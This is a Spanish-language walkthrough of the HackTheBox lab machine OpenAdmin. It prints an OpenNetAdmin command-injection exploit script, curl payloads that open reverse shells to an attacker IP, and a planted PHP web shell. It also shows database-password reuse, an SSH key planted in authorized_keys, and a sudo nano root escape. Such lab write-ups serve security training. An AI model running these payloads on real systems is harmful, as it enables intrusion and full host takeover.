---
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# OpenAdmin

`OpenAdmin` es una máquina Linux de dificultad fácil que cuenta con una instancia de CMS OpenNetAdmin obsoleta. El CMS se explota para obtener un punto de apoyo y la enumeración posterior revela credenciales de la base de datos. Estas credenciales se reutilizan para pasar de forma lateral a un usuario con pocos privilegios. Se descubre que este usuario tiene acceso a una aplicación interna restringida. El examen de esta aplicación revela credenciales que se utilizan para pasar de forma lateral a un segundo usuario. Luego se explota una configuración incorrecta de sudo para obtener un shell de root.

<figure><img src="../../.gitbook/assets/OpenAdmin.png" alt="" width="563"><figcaption></figcaption></figure>

***

## Reconnaissance

Realizaremos un reconocimiento con `nmap` para ver los puertos que están expuestos en la máquina **`OpenAdmin`**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.

```bash
❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.10.171 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-07 05:41 CET
Initiating SYN Stealth Scan at 05:41
Scanning 10.10.10.171 [65535 ports]
Discovered open port 22/tcp on 10.10.10.171
Discovered open port 80/tcp on 10.10.10.171
Completed SYN Stealth Scan at 05:42, 29.99s elapsed (65535 total ports)
Nmap scan report for 10.10.10.171
Host is up, received user-set (0.078s latency).
Scanned at 2025-03-07 05:41:34 CET for 30s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 30.10 seconds
           Raw packets sent: 75682 (3.330MB) | Rcvd: 75480 (3.020MB)
```

A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.

```bash
❯ extractPorts allPorts

[*] Extracting information...

      [*] IP Address: 10.10.10.171
      [*] Open ports: 22,80

[*] Ports copied to clipboard
```

Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado, comprobamos que se encuentran abierta una página web de `Apache` y el servicio`SSH`.

```bash
❯ nmap -sCV -p22,80 10.10.10.171 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-07 05:42 CET
Nmap scan report for 10.10.10.171
Host is up (0.079s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   105.01 ms 10.10.14.1
2   102.84 ms 10.10.10.171

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.41 seconds
```

Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.

```bash
❯ xsltproc targetedXML > index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.

<figure><img src="../../.gitbook/assets/5429_vmware_ofyTNzmFCJ.png" alt=""><figcaption></figcaption></figure>

## Web Enumeration

Accederemos a [http://10.10.10.171 ](http://10.10.10.171)y nos encontraremos con la página por defecto que viene predeterminada con `Apache`.

<figure><img src="../../.gitbook/assets/imagen.png" alt=""><figcaption></figcaption></figure>

Realizaremos una enumeración de directorios de la página web a través de la herramienta de `gobuster`. En el resultado obtenido, logramos encontrar 3 directorios de la página web.

```bash
❯ gobuster dir -u http://10.10.10.171/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -b 503,404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.171/
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   503,404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/music                (Status: 301) [Size: 312] [--> http://10.10.10.171/music/]
/artwork              (Status: 301) [Size: 314] [--> http://10.10.10.171/artwork/]
/sierra               (Status: 301) [Size: 313] [--> http://10.10.10.171/sierra/]
```

Accederemos a los diferentes directorios (`/music`, `/artwork` y `/sierra`) y nos encontraremos con las siguientes páginas web.

{% tabs %}
{% tab title="MUSIC" %}
<figure><img src="../../.gitbook/assets/5430_vmware_ME0plhqU5C (1) (1).png" alt=""><figcaption></figcaption></figure>
{% endtab %}

{% tab title="ARTWORK" %}
<figure><img src="../../.gitbook/assets/imagen (1).png" alt=""><figcaption></figcaption></figure>
{% endtab %}

{% tab title="SIERRA" %}
<figure><img src="../../.gitbook/assets/imagen (2).png" alt=""><figcaption></figcaption></figure>
{% endtab %}
{% endtabs %}

## Initial Foothold

### OpenNetAdmin v18.1.1 Exploitation - Remote Code Execution

Después de revisar en las diferentes páginas, nos encontramos en que la página web ubicada en [http://10.10.10.171/music](http://10.10.10.171/music) dispone de una página de `Login`la cual nos redirige a [http://10.10.10.171/ona/](http://10.10.10.171/ona/).

<figure><img src="../../.gitbook/assets/5430_vmware_ME0plhqU5C.png" alt=""><figcaption></figcaption></figure>

Antes de acceder a esta nueva página, realizaremos a través de la herramienta de `whatweb` un reconocimiento inicial de las tecnologías que utiliza la aplicación web.

```bash
❯ whatweb -a 3 http://10.10.10.171/ona/
http://10.10.10.171/ona/ [200 OK] Apache[2.4.29], Cookies[ONA_SESSION_ID,ona_context_name], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.171], Script[javascript,text/javascript], Title[OpenNetAdmin :: 0wn Your Network]
```

Al acceder a [http://10.10.10.171/ona/](http://10.10.10.171/ona/) nos encontramos con la siguiente página web de `OpenNetAdmin`. Nos encontramos con una sesión de `guest` iniciada y también comprobamos que dispone de una versión `v18.1.1`.

{% hint style="info" %}
OpenNetAdmin proporciona un inventario de su red IP administrado por base de datos . Cada subred, host e IP se puede rastrear a través de una interfaz web centralizada habilitada para AJAX que puede ayudar a reducir los errores de rastreo. También está disponible una interfaz CLI completa para usarla en scripts y trabajos masivos.
{% endhint %}

<figure><img src="../../.gitbook/assets/imagen (3).png" alt=""><figcaption></figcaption></figure>

Realizaremos una búsqueda de vulnerabilidades conocidas de `OpenNetAdmin` a través de la herramienta de `searchsploit`. En el resultado obtenido, comprobamos que la aplicación es vulnerable a `Command Injection`y `Remote Code Execution`.

```bash
❯ searchsploit OpenNetAdmin
----------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                               |  Path
----------------------------------------------------------------------------- ---------------------------------
OpenNetAdmin 13.03.01 - Remote Code Execution                                | php/webapps/26682.txt
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)                 | php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                                  | php/webapps/47691.sh
----------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

Realizaremos la misma búsqueda por Internet y también logramos encontrar vulnerabilidades para esta versión.

<figure><img src="../../.gitbook/assets/imagen (4).png" alt="" width="530"><figcaption></figcaption></figure>

El exploit que hemos encontrado para lograr explotar la vulnerabilidad es la siguiente, realiza una solicitud mediante `cURL` en el cual a través de una serie de datos podemos conseguir una ejecución de comandos remotos `RCE`.

```bash
#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```

#### Explotación manual

Realizamos la explotación de la vulnerabilidad manualmente a través de `cURL` y comprobamos que al intentar ejecutar el comando `id`, en el resultado que se nos muestra confirmamos el `output` de la ejecución de comandos.

```bash
❯ curl -s -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;id&xajaxargs[]=ping"  http://10.10.10.171/ona/
<?xml version="1.0" encoding="utf-8" ?><xjx><cmd n="js"><![CDATA[removeElement('tooltips_results');]]></cmd><cmd n="ce" t="window_container" p="tooltips_results"><![CDATA[div]]></cmd><cmd n="js"><![CDATA[initialize_window('tooltips_results');el('tooltips_results').style.display = 'none';el('tooltips_results').style.visibility = 'hidden';el('tooltips_results').onclick = function(ev) { focus_window(this.id); };]]></cmd><cmd n="as" t="tooltips_results" p="innerHTML"><![CDATA[

...[snip]...
 <pre style="padding: 4px;font-family: monospace;">uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

El siguiente paso será lograr obtener una Reverse Shell para lograr conectarnos a la máquina vulnerable. Para ello, nos pondremos en escucha para recibir la Reverse Shell.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```

A través del siguiente comando, lograremos explotar la vulnerabilidad presente en `OpenNetAdmin` indicándole que ejecute una Reverse Shell hacia nuestro equipo.

```bash
❯ curl -s -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;/bin/bash -c 'bash -i >%26 /dev/tcp/10.10.14.2/443 0>%261'&xajaxargs[]=ping"  http://10.10.10.171/ona/
```

Verificamos que finalmente logramos obtener acceso a la máquina victima con el usuario`www-data`.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.171] 46856
bash: cannot set terminal process group (1300): Inappropriate ioctl for device
bash: no job control in this shell
www-data@openadmin:/opt/ona/www$ 
```

#### Explotación automatizada

Por otro lado, también podemos hacer la explotación a través del siguiente exploit que nos hemos encontrado en GitHub el cual realiza la explotación de la vulnerabilidad de manera más automatizada.

{% embed url="https://github.com/sec-it/OpenNetAdmin-RCE" %}

```bash
❯ git clone https://github.com/sec-it/OpenNetAdmin-RCE; cd OpenNetAdmin-RCE
Clonando en 'OpenNetAdmin-RCE'...
remote: Enumerating objects: 10, done.
remote: Counting objects: 100% (10/10), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 10 (delta 2), reused 5 (delta 0), pack-reused 0 (from 0)
Recibiendo objetos: 100% (10/10), 4.78 KiB | 4.78 MiB/s, listo.
Resolviendo deltas: 100% (2/2), listo.
```

Nos volveremos a poner en escucha con `nc` para recibir la Reverse Shell.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```

Ejecutaremos el exploit indicándole la `URL Target` donde se encuentra el `OpenNetAdmin` y le indicaremos que ejecute una Reverse Shell.

```bash
❯ ruby exploit.rb exploit http://10.10.10.171/ona/ '/bin/bash -c "bash -i >& /dev/tcp/10.10.14.2/443 0>&1"'
```

Comprobamos que finalmente logramos obtener acceso al sistema a través de la Reverse Shell. Al recibir la RevShell, realizaremos el tratamiento básico para lograr obtener una `TTY` totalmente interactiva.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.171] 46872
bash: cannot set terminal process group (1300): Inappropriate ioctl for device
bash: no job control in this shell
www-data@openadmin:/opt/ona/www$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@openadmin:/opt/ona/www$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo;fg
[1]  + continued  nc -nlvp 443
                              reset xterm
www-data@openadmin:/opt/ona/www$ export TERM=xterm
www-data@openadmin:/opt/ona/www$ export SHELL=bash
www-data@openadmin:/opt/ona/www$ stty rows 46 columns 230
```

## Pivoting as jimmy user

### Information Leakage

Revisando el directorio donde nos encontramos, verificamos un archivo llamado `database_settings.inc.php` de configuración de la base de datos. En dicho archivo, logramos obtener una contraseña en texto plano.

```bash
www-data@openadmin:/opt/ona/www/local/config$ ls -l
total 8
-rw-r--r-- 1 www-data www-data  426 Nov 21  2019 database_settings.inc.php
-rw-rw-r-- 1 www-data www-data 1201 Jan  3  2018 motd.txt.example
-rw-r--r-- 1 www-data www-data    0 Nov 21  2019 run_installer
www-data@openadmin:/opt/ona/www/local/config$ cat database_settings.inc.php 
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```

### Trying access on SSH with recently found password

Probamos de comprobar si estas credenciales se reutilizan para el usuario `jimmy`que hemos encontrado que dispone de `bash` (comprobado desde el archivo `/etc/passwd`).

```bash
❯ sshpass -p 'n1nj4W4rri0R!' ssh jimmy@10.10.10.171
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Mar  7 04:58:48 UTC 2025

  System load:  0.19              Processes:             177
  Usage of /:   31.2% of 7.81GB   Users logged in:       0
  Memory usage: 10%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.


Last login: Thu Jan  2 20:50:03 2020 from 10.10.14.3
jimmy@openadmin:~$ 
```

## Initial Access

### Internal Website found

Revisando los archivos de configuración de `Apache`, nos encontramos habilitado una página web interna en el puerto `52846` la cual se llama `internal.openadmin.htb` y tiene asignado el `AssignUserID`como `joanna`. Lo cual nos sugiere que quizás `joanna` levante este servicio.

```bash
jimmy@openadmin:/home$ cat /etc/apache2/sites-enabled/internal.conf 
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```

### Port Forwarding with Chisel

Desde nuestro equipo atacante, dispondremos del binario de `chisel` el cual compartiremos a través de un servidor web con Python.

```bash
❯ ls -l chisel
.rwxr-xr-x kali kali 8.9 MB Sun Feb 16 03:43:15 2025  chisel

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

En la máquina víctima, nos descargaremos el binario compartido y le daremos los permisos de ejecución correspondientes.

```bash
jimmy@openadmin:/tmp$ wget 10.10.14.2/chisel; chmod +x chisel
--2025-03-07 05:50:16--  http://10.10.14.2/chisel
Connecting to 10.10.14.2:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 9371800 (8.9M) [application/octet-stream]
Saving to: ‘chisel’

chisel                      100%[==========================================>]   8.94M   666KB/s    in 15s     

2025-03-07 05:50:31 (623 KB/s) - ‘chisel’ saved [9371800/9371800]

jimmy@openadmin:/tmp$ 
```

En nuestra máquina atacante, configuraremos el `chisel`para que actúe como servidor a través del puerto `1234`.

```bash
❯ ./chisel server --reverse -p 1234
2025/03/07 06:49:43 server: Reverse tunnelling enabled
2025/03/07 06:49:43 server: Fingerprint QXtg34BSTLW+VL8Zau8gxZzNeq/nc/PIJyDObTACqS8=
2025/03/07 06:49:43 server: Listening on http://0.0.0.0:1234
```

A través de la máquina vícitma, indicaremos a `chisel` que actúe como cliente y se conecte a nuestro equipo realizando un `Port Forwarding` del puerto interno de la página web encontrada hacia nuestro equipo.

```bash
jimmy@openadmin:/tmp$ ./chisel client 10.10.14.2:1234 R:52846:127.0.0.1:52846
2025/03/07 05:52:03 client: Connecting to ws://10.10.14.2:1234
2025/03/07 05:52:05 client: Connected (Latency 276.304265ms)
```

Desde nuestro navegador accederemos a [http://localhost:52846](http://localhost:52846) y comprobaremos el siguiente contenido de la página web.

<figure><img src="../../.gitbook/assets/5436_vmware_v3hltd2ne8.png" alt=""><figcaption></figcaption></figure>

### Gaining Access via Webshell in a Writable Web Directory

A través del usuario `jimmy`, comprobamos que disponemos de permisos de escritura en el directorio `/var/www/internal` en el cual se está levantando esta página web interna. Por lo tanto, lo que decidimos probar es en crear un archivo llamado `gzzcoo.php` el cual se trate de una simple `web shell` para utilizarla y lograr ejecutar comandos.

```bash
jimmy@openadmin:/var/www/internal$ ls -la
total 20
drwxrwx--- 2 jimmy internal 4096 Nov 23  2019 .
drwxr-xr-x 4 root  root     4096 Nov 22  2019 ..
-rwxrwxr-x 1 jimmy internal 3229 Nov 22  2019 index.php
-rwxrwxr-x 1 jimmy internal  185 Nov 23  2019 logout.php
-rwxrwxr-x 1 jimmy internal  339 Nov 23  2019 main.php
jimmy@openadmin:/var/www/internal$ echo -e '<?php \n system($_GET["cmd"]); \n ?>' > gzzcoo.php
jimmy@openadmin:/var/www/internal$ cat gzzcoo.php 
<?php 
 system($_GET["cmd"]); 
 ?>
```

Desde nuestra máquina atacante, realizaremos la comprobación de ejecución de comandos. En nuestra primera prueba, indicamos que ejecute el comando `id`, confirmando que la usuaria `joanna` ees la que ejecuta este servidor web y hemos sido capaces de ejecutar comandos remotod.s&#x20;

```bash
❯ curl -s 'http://127.0.0.1:52846/gzzcoo.php?cmd=id'
uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
```

Nos pondremos en escucha con `nc` para recibir la Reverse Shell.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```

Codificaremos en `URL Encode` la sintaxis de la Reverse Shell y utilizaremos la herramienta de `cURL`para que realice la petición hacia nuestra `web shell`y logre ejecutar la Reverse Shell.

```bash
❯ echo -n 'bash -c "bash -i >& /dev/tcp/10.10.14.2/443 0>&1"' | jq -sRr @uri
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.2%2F443%200%3E%261%22
❯ curl -s 'http://127.0.0.1:52846/gzzcoo.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.2%2F443%200%3E%261%22'
```

Comprobamos que disponemos de acceso al sistema con el usuario `joanna` y logramos visualizar finalmente la flag **user.txt**.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.171] 47666
bash: cannot set terminal process group (1300): Inappropriate ioctl for device
bash: no job control in this shell
joanna@openadmin:/var/www/internal$ whoami
joanna
joanna@openadmin:/var/www/internal$ cat /home/joanna/user.txt 
7bd9************************
```

Realizaremos un tratamiento de la terminal para poder obtener una TTY totalmente interactiva.

```bash
oanna@openadmin:/var/www/internal$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
joanna@openadmin:/var/www/internal$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo;fg
[1]  + continued  nc -nlvp 443
                              reset xterm
joanna@openadmin:/var/www/internal$ export TERM=xterm
joanna@openadmin:/var/www/internal$ export SHELL=bash
joanna@openadmin:/var/www/internal$ stty rows 46 columns 230
```

## Privilege Escalation

### Abusing Sudoers Privilege (nano)

Al revisar si el usuario `joanna` dispone de algún permiso de `sudoers`, nos mostraba el siguiente mensaje de error.&#x20;

{% hint style="info" %}
Según [`ChatGPT`](https://chatgpt.com), este mensaje se puede deber a estos motivos.

#### Posibles causas:

1. **Falta de un entorno de sesión completo**\
   Cuando te conectas por SSH, el sistema te asigna una sesión completa con todas las variables de entorno y permisos adecuados. En cambio, con una reverse shell, el entorno es mínimo y puede que `sudo` no tenga acceso a todas las configuraciones necesarias.
2. **Limitaciones de permisos en `setresuid`**\
   El error `setresuid(0, -1, -1): Operation not permitted` indica que `sudo` está intentando cambiar al usuario root, pero no tiene permiso en este entorno. Esto podría deberse a:
   * Un control de seguridad como **seccomp** o **AppArmor** que bloquea ciertas llamadas al sistema.
   * Un sistema con restricciones para shells no interactivas.
3. **Audit Plugin de sudo fallando**\
   El error `error initializing audit plugin sudoers_audit` sugiere que `sudo` está intentando registrar la acción, pero no puede porque la shell inversa no tiene un entorno adecuado para inicializar el módulo de auditoría.
{% endhint %}

```bash
joanna@openadmin:/var/www/internal$ sudo -l
sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted
sudo: error initializing audit plugin sudoers_audit
```

Por lo tanto, lo que decidimos es en subir nuestra clave pública en las claves autorizadas SSH del usuario`joanna`. Para ello, nos crearemos unas claves `SSH` en nuestro equipo de atacante y copiaremos el contenido de la clave pública generada.

```bash
❯ ssh-keygen
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/kali/.ssh/id_ed25519): 
Enter passphrase for "/home/kali/.ssh/id_ed25519" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/.ssh/id_ed25519
Your public key has been saved in /home/kali/.ssh/id_ed25519.pub
The key fingerprint is:
SHA256:3MgDLLifHsarN8CwqLu/oV1aNKmquqjHOVazTbHYf+M kali@kali
The key's randomart image is:
+--[ED25519 256]--+
|                 |
|   . .           |
|  . . o          |
|.  . o.+ o       |
|.+. +o oS .      |
|o o=+o+  .       |
|..o+O= .         |
|o+*B+o. . o      |
|#B*=o.   oE.     |
+----[SHA256]-----+

❯ cat /home/kali/.ssh/id_ed25519.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB30SsUFMFi9+gBGbURaDWPr6LcsZ7seEWZgAtRqGLv9 kali@kali
```

Escribiremos en el archivo `/home/joanna/.ssh/authorized_keys` nuestra clave pública `SSH` para ganar acceso al equipo como el usuario `joanna` mediante `SSH` sin proporcionar credenciales.

```bash
joanna@openadmin:/var/www/internal$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB30SsUFMFi9+gBGbURaDWPr6LcsZ7seEWZgAtRqGLv9 kali@kali' > /home/joanna/.ssh/authorized_keys
joanna@openadmin:/var/www/internal$ cat /home/joanna/.ssh/authorized_keys
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB30SsUFMFi9+gBGbURaDWPr6LcsZ7seEWZgAtRqGLv9 kali@kali
```

Probamos de autenticarnos con el usuario `joanna` conectándonos mediante `SSH` al equipo, finalmente logramos el acceso correctamente. Ejecutaremos un `export TERM=xterm` para poder realizar `Ctrl+L`.

```bash
❯ ssh joanna@10.10.10.171
The authenticity of host '10.10.10.171 (10.10.10.171)' can't be established.
ED25519 key fingerprint is SHA256:wrS/uECrHJqacx68XwnuvI9W+bbKl+rKdSh799gacqo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.171' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Mar  7 06:00:55 UTC 2025

  System load:  0.0               Processes:             186
  Usage of /:   31.4% of 7.81GB   Users logged in:       1
  Memory usage: 11%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Jul 27 06:12:07 2021 from 10.10.14.15
joanna@openadmin:~$ export TERM=xterm
```

Ahora si ejecutamos `sudo -l`, ya no nos muestra el mensaje de error que vimos anteriormente. Al comprobar si este usuario dispone depermisos de `sudoers`, nos encontramos que el usuario puede ejecutar como `sudo` sin proporcionar credenciales el binario`/bin/nano` sobre el archivo ubicado en `/opt/priv`.

{% hint style="info" %}
En informática, nano (oficialmente GNU nano) es un editor de texto para sistemas Unix basado en curses. Es un clon de Pico, el editor del cliente de correo electrónico Pine. nano trata de emular la funcionalidad y la interfaz de fácil manejo de Pico, pero sin la integración con Pine.
{% endhint %}

```bash
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

A través de la herramienta de [`searchbins`](https://github.com/r1vs3c/searchbins) nos encontramos la manera de explotar este binario como `sudo` y lograr obtener una Shell como usuario `root`.

```bash
❯ searchbins -b nano -f sudo

[+] Binary: nano

================================================================================
[*] Function: sudo -> [https://gtfobins.github.io/gtfobins/nano/#sudo]

	| sudo nano
	| ^R^X
	| reset; sh 1>&0 2>&0
```

Ejecutaremos el comando `sudo /bin/nano /opt/priv` para editar el archivo con permisos de `sudo`.

Una vez estemos dentro del archivo con el editor `nano`, para poder obtener una shell como `root`, deberemos de presionar `Ctrl+R` para acceder al apartado de `Read file`.

```bash
joanna@openadmin:~$ sudo /bin/nano /opt/priv
```

<figure><img src="../../.gitbook/assets/5438_vmware_KmrP2NgF9u.png" alt=""><figcaption></figcaption></figure>

Una vez estemos en el modo de `Read File`, presionaremos la combinación de `Ctrl+X` para acceder a la opción de `Execute Command`.

<figure><img src="../../.gitbook/assets/imagen (5).png" alt=""><figcaption></figcaption></figure>

Al seleccionar esta nueva opción, comprobamos que nos permite realizar una ejecución de comandos. Esto es debido que `nano` tiene implementado una manera para lograr ejecutar un comando en el sistema y que el `output` del resultado del comando se almacene en nuestro archivo en el que nos encontramos trabajando.

Teniendo esto en cuenta, podemos aprovecharnos de esto para ganar acceso a una shell a través del siguiente comando.

```bash
reset; sh 1>&0 2>&0
```

<figure><img src="../../.gitbook/assets/5440_vmware_DZfbDtVaH9.png" alt=""><figcaption></figcaption></figure>

Verificamos que por detrás de `nano`, se nos ha abierto una `shell` en la cual podemos ejecutar comandos. Ejecutaremos `/bin/bash`para obtener una `bash`. Finalmente logramos visualizar la flag **root.txt**.

<figure><img src="../../.gitbook/assets/5441_vmware_cIDCOTELmi.png" alt=""><figcaption></figcaption></figure>

```bash
# whoami
root
# /bin/bash   
root@openadmin:/home/joanna# cat /root/root.txt 
9452****************************
```
